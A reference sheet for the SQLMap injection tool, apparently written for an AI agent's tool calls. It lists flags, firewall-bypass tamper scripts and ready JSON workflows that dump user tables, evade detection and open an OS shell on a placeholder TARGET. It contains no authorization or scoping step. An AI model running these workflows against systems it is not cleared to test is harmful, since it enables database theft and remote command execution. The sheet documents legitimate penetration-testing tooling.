# SQLMap

> [warn] **LONG-RUNNING** — Always use `"background": true`. SQL injection testing takes minutes per parameter.
> `{"tool_name": "sqlmap_scan", "tool_args": {"url": "...", "flags": "--batch --random-agent", "background": true}}` (`sqlmap_scan`)

Automated SQL injection detection and exploitation. Use after finding a parameter.

## Installation

| Method | Command |
|--------|---------|
| **Homebrew (macOS)** | `brew install sqlmap` |
| **APT (Kali/Debian)** | `sudo apt install sqlmap` |
| **PIP** | `pip3 install sqlmap` |
| **Git clone** | `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap` then `python3 /opt/sqlmap/sqlmap.py` |

## Parameters

| Parameter | Required | Description |
|-----------|----------|-------------|
| `url` | Yes | Target URL with parameter (e.g. `http://TARGET/page?id=1`) |
| `flags` | No | Extra flags (default: `--batch --random-agent`) |

## All SQLMap Flags

### Target
| Flag | Description | Example |
|------|-------------|---------|
| `-u URL` | Target URL | `-u "http://TARGET/page?id=1"` |
| `--data="POST body"` | POST data | `--data "user=admin&pass=test"` |
| `--cookie="x=y"` | HTTP Cookie | `--cookie "session=abc123"` |
| `--headers="X: Y"` | Custom headers | |
| `-r request.txt` | Load from request file | |
| `-m targets.txt` | Multiple targets | |
| `--method=POST` | Force HTTP method | |

### Detection
| Flag | Description |
|------|-------------|
| `--level=1-5` | Test depth (5 = heaviest) |
| `--risk=1-3` | Risk level (3 = dangerous) |
| `--string="success"` | String to match for True |
| `--code=200` | HTTP code to match for True |
| `--text-only` | Compare text content only |
| `--titles` | Compare page titles |

### Enumeration
| Flag | Description |
|------|-------------|
| `--banner` | DB banner |
| `--current-user` | Current DB user |
| `--current-db` | Current database name |
| `--hostname` | DB server hostname |
| `--dbs` | List all databases |
| `--tables` | Enumerate tables |
| `--columns` | Enumerate columns |
| `--dump` | Dump table data |
| `--dump-all` | Dump entire DB |
| `-D dbname` | Target database |
| `-T tablename` | Target table |
| `-C col1,col2` | Target columns |
| `--schema` | DB schema |
| `--exclude-sysdbs` | Skip system DBs |
| `--sql-query="SELECT * FROM users"` | Custom SQL query |
| `--sql-shell` | Interactive SQL shell |

### Exploitation
| Flag | Description |
|------|-------------|
| `--os-shell` | Interactive OS shell (MySQL/MSSQL) |
| `--os-cmd=command` | Single OS command |
| `--os-pwn` | OOB shell/metrepreter |
| `--priv-esc` | Database privilege escalation |
| `--reg-read` | Read Windows registry |
| `--reg-add` | Write registry |
| `--reg-del` | Delete registry |

### Evasion
| Flag | Description |
|------|-------------|
| `--tamper=space2comment` | Use tamper script |
| `--tamper=*` | All tamper scripts |
| `--random-agent` | Random User-Agent |
| `--proxy=http://127.0.0.1:8080` | Use proxy (Burp) |
| `--tor` | Use Tor |
| `--check-tor` | Verify Tor |
| `--delay=2` | Delay between requests |
| `--safe-url=URL` | Frequent safe URL |
| `--safe-freq=10` | Safe URL frequency |

### Optimization
| Flag | Description |
|------|-------------|
| `--batch` | Never ask for input |
| `--threads=10` | Concurrent threads |
| `--smart` | Quick test (only if heuristic) |
| `--union-cols=1-20` | Test UNION columns |

## Tamper Scripts (WAF Bypass)

| Script | Bypasses |
|--------|----------|
| `space2comment` | Space filters |
| `between` | BETWEEN instead of > |
| `equaltolike` | LIKE instead of = |
| `greatest` | GREATEST instead of > |
| `multiplespaces` | Multiple spaces |
| `bluecoat` | Bluecoat WAF |
| `modsecurityversioned` | ModSecurity |
| `charencode` | URL encoding |
| `charunicodeencode` | Unicode encoding |
| `base64encode` | Base64 payload |
| `apostrophemaskencode` | Apostrophe bypass |
| `percentage` | Percentage encoding |

## Workflows

### Quick check
```json
{"tool": "sqlmap_scan", "args": {"url": "http://TARGET/page?id=1"}}
```

### Enumerate databases
```json
{"tool": "sqlmap_scan", "args": {"url": "http://TARGET/page?id=1", "flags": "--batch --random-agent --dbs"}}
```

### Dump a specific table
```json
{"tool": "sqlmap_scan", "args": {"url": "http://TARGET/page?id=1", "flags": "--batch -D dbname -T users --dump"}}
```

### POST injection
```json
{"tool": "sqlmap_scan", "args": {"url": "http://TARGET/login", "flags": "--batch --data='user=admin&pass=test'"}}
```

### With WAF bypass
```json
{"tool": "sqlmap_scan", "args": {"url": "http://TARGET/page?id=1", "flags": "--batch --tamper=space2comment --random-agent --delay=1"}}
```

### OS shell
```json
{"tool": "sqlmap_scan", "args": {"url": "http://TARGET/page?id=1", "flags": "--batch --os-shell"}}
```

## Response Analysis

| Response Pattern | Meaning |
|-----------------|---------|
| "Parameter seems injectable" | SQLi confirmed |
| "Time delays detected" | Blind SQLi possible |
| "All tested parameters appear NOT injectable" | No SQLi found |
| "WAF detected" | Web app firewall blocking |

## Typical DBMS Detection

| Banner | DB Type |
|--------|---------|
| `MySQL` | MySQL |
| `PostgreSQL` | PostgreSQL |
| `Microsoft SQL Server` | MSSQL |
| `Oracle` | Oracle |
| `SQLite` | SQLite |
| `Firebird` | Firebird |
